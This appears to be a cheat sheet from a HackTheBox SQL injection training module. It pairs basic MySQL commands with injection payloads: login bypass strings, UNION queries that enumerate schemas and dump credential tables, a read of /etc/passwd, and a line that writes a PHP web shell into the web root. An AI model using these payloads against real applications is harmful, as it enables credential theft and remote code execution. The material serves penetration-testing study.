### MySQL Command Reference

### General

```sql
mysql -u root -h docker.hackthebox.eu -P 3306 -p  -- Login to MySQL database.
SHOW DATABASES;  -- List available databases.
USE users;  -- Switch to a database.
```

### Tables

```sql
CREATE TABLE logins (id INT, ...);  -- Add a new table.
SHOW TABLES;  -- List available tables in the current database.
DESCRIBE logins;  -- Show table properties and columns.
INSERT INTO table_name VALUES (value_1,..);  -- Add values to a table.
INSERT INTO table_name(column2, ...) VALUES (column2_value, ..);  -- Add values to specific columns in a table.
UPDATE table_name SET column1=newvalue1, ... WHERE <condition>;  -- Update table values.
```

### Columns

```sql
SELECT * FROM table_name;  -- Show all columns in a table.
SELECT column1, column2 FROM table_name;  -- Show specific columns in a table.
DROP TABLE logins;  -- Delete a table.
ALTER TABLE logins ADD newColumn INT;  -- Add new column.
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;  -- Rename a column.
ALTER TABLE logins MODIFY oldColumn DATE;  -- Change column datatype.
ALTER TABLE logins DROP oldColumn;  -- Delete a column.
```

### Output

```sql
SELECT * FROM logins ORDER BY column_1;  -- Sort by column.
SELECT * FROM logins ORDER BY column_1 DESC;  -- Sort by column in descending order.
SELECT * FROM logins ORDER BY column_1 DESC, id ASC;  -- Sort by two columns.
SELECT * FROM logins LIMIT 2;  -- Only show the first two results.
SELECT * FROM logins LIMIT 1, 2;  -- Show two results starting from index 2.
SELECT * FROM table_name WHERE <condition>;  -- List results that meet a condition.
SELECT * FROM logins WHERE username LIKE 'admin%';  -- List results where the name is similar to a given string.
```

### MySQL Operator Precedence

1. Division (/), Multiplication (*), and Modulus (%)
2. Addition (+) and Subtraction (-)
3. Comparison (=, >, <, <=, >=, !=, LIKE)
4. NOT (!)
5. AND (&&)
6. OR (||)

### SQL Injection Techniques

### Auth Bypass

```sql
admin' or '1'='1  -- Basic Auth Bypass.
admin')-- -  -- Basic Auth Bypass with comments.
```

### Auth Bypass Payloads

- Use variations based on the application's response to refine bypass strategies.

### Union Injection

```sql
' order by 1-- -  -- Detect number of columns using ORDER BY.
cn' UNION select 1,2,3-- -  -- Detect number of columns using UNION.
cn' UNION select 1,@@version,3,4-- -  -- Basic Union injection.
UNION select username, 2, 3, 4 from passwords-- -  -- Union injection for 4 columns.
```

### DB Enumeration

```sql
SELECT @@version;  -- Fingerprint MySQL with query output.
SELECT SLEEP(5);  -- Fingerprint MySQL with no output.
cn' UNION select 1,database(),2,3-- -  -- Current database name.
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -  -- List all databases.
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -  -- List all tables in a specific database.
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -  -- List all columns in a specific table.
cn' UNION select 1, username, password, 4 from dev.credentials-- -  -- Dump data from a table in another database.
```

### Privileges

```sql
cn' UNION SELECT 1, user(), 3, 4-- -  -- Find current user.
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -  -- Check if user has admin privileges.
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -  -- Find all user privileges.
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -  -- Find accessible directories via MySQL.
```

### File Injection

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -  -- Read a local file.
select 'file written successfully!' into outfile '/var/www/html/proof.txt';  -- Write a string to a local file.
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -  -- Upload a PHP web shell.
```

